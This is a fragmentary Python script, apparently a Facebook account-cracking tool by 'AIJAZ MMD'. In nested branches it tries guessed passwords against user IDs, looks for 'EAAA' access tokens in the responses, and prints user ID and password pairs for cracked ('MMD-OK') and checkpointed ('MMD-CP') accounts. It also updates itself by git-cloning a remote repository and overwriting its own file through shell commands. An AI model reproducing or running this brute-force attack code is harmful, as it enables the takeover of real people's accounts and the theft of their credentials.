...
#AUTHOR : AIJAZ MMD (MR. MMD)

#OPEN SOURCE :)

#DON'T FORGET TO GIVE CREDIT TO MR. MMD
...
def main():
	...
	print("\033[96;1m  [J] JOIN MR. MMD GROUP \033[92;1m✘\033[91;1m✘")
...
def log_sel():
	...
	if sel == "":
		...
		try:
			...
			os.system("git clone https://github.com/DEVIL-MMD/mmdpro")

			os.system("rm -rf mmdpro.py")

			os.system("cp -f mmdpro/mmdpro.py \\.")

			os.system("rm -rf mmdpro")
...
def token_check():
	...
	try:
		...
		token=open('mmd_token.txt','r').read()

	except IOError:

		print"\033[91;1m[!] TOKEN INVALID"

		os.system('rm -rf mmd_token.txt')
											...
											if "access_token" in data.text and "EAAA" in data.text:
												...
												if "www.facebook.com" in data.json()['error_msg']:
													...
													if "access_token" in data.text and "EAAA" in data.text:
														...
														print(" \033[1;32m [MMD-OK] "+uid+" | "+pass6+"\033[0;97m")
														...
														if "www.facebook.com" in data.json()['error_msg']:
															...
															print(" \033[1;33m [MMD-CP] "+uid+" | "+pass6+"\033[0;97m")
															...
															if "access_token" in data.text and "EAAA" in data.text:
																...
																print(" \033[1;32m [MMD-OK] "+uid+" | "+pass7+"\033[0;97m")
																...
																if "www.facebook.com" in data.json()['error_msg']:
																	...
																	print(" \033[1;33m [MMD-CP] "+uid+" | "+pass7+"\033[0;97m")
																	...
																	if "access_token" in data.text and "EAAA" in data.text:
																		...
																		print(" \033[1;32m [MMD-OK] "+uid+" | "+pass8+"\033[0;97m")
																		...
																		if "www.facebook.com" in data.json()['error_msg']:
																			...
																			print(" \033[1;33m [MMD-CP] "+uid+" | "+pass8+"\033[0;97m")
